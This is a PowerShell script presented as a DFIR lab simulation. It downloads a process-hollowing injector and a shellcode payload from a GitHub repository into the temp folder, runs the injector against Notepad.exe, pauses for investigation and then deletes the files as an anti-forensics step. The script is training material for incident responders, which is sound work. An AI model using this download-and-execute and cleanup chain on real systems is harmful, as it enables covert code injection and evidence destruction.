# DFIR Lab Simulation Script
# This script simulates the initial stage of a Process Hollowing attack.

# --- Configuration Variables ---
# NOTE: Ensure the file names below match what you uploaded to your main branch
$repo = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main"
$hollow_exe = "hollow.exe"
$payload_bin = "payload.bin"
$temp_dir = "$env:TEMP" # Downloads will go to C:\Users\<Username>\AppData\Local\Temp

Write-Host "[*] Starting Attack Simulation for DFIR Lab..." -ForegroundColor Green
Write-Host "----------------------------------------------------" -ForegroundColor Green

# 1. Download Attacker Tools (Artifacts Creation)
Write-Host "[*] Downloading hollowing loader and payload from GitHub..." -ForegroundColor Yellow

# Download the C++ injector executable
Invoke-WebRequest -Uri "$repo/$hollow_exe" -OutFile "$temp_dir\$hollow_exe" -Verbose
# Download the raw binary shellcode payload
Invoke-WebRequest -Uri "$repo/$payload_bin" -OutFile "$temp_dir\$payload_bin" -Verbose

Write-Host "[+] Files downloaded to $temp_dir" -ForegroundColor Green

# 2. Execute Hollowing Loader
Write-Host " "
Write-Host "[*] Executing **Hollowing Loader** to inject into Notepad.exe..." -ForegroundColor Yellow

# This command executes the hollowing program:
# -FilePath: Specifies the injector program (hollow.exe)
# -ArgumentList: Passes the path to the payload (payload.bin) to the injector
# -NoNewWindow: Ensures the C++ output appears in this PowerShell window
# -Wait: Pauses the script until hollow.exe finishes or crashes
Start-Process -FilePath "$temp_dir\$hollow_exe" -ArgumentList "$temp_dir\$payload_bin" -NoNewWindow -Wait

Write-Host " "

# 3. DFIR Analysis Break Point (Pause)
Write-Host "====================================================" -ForegroundColor Cyan
Write-Host "**!!! DFIR INVESTIGATION PHASE !!!**" -ForegroundColor Cyan
Write-Host "The injection process has completed (successfully or not)." -ForegroundColor Cyan
Write-Host "Your **Notepad.exe** process should now be running the autoclicker payload." -ForegroundColor Cyan
Write-Host " " -ForegroundColor Cyan
Write-Host "Tasks to perform NOW (before cleanup):" -ForegroundColor Cyan
Write-Host " - Analyze the running Notepad process (PID) using Process Hacker/Explorer." -ForegroundColor Cyan
Write-Host " - Dump the process memory and analyze the injected shellcode." -ForegroundColor Cyan
Write-Host " - Search for the downloaded files in the $temp_dir folder." -ForegroundColor Cyan
Write-Host "====================================================" -ForegroundColor Cyan
Read-Host -Prompt "Press Enter to delete the artifacts and finish the simulation cleanup..."

# 4. Cleanup Artifacts (Anti-Forensics Step)
Write-Host " "
Write-Host "[*] **Anti-Forensics:** Cleaning up downloaded artifacts..." -ForegroundColor Red

# Delete the downloaded executable and payload
Remove-Item "$temp_dir\$hollow_exe" -Force
Remove-Item "$temp_dir\$payload_bin" -Force

Write-Host "[+] Simulation Complete. Downloaded files removed." -ForegroundColor Green
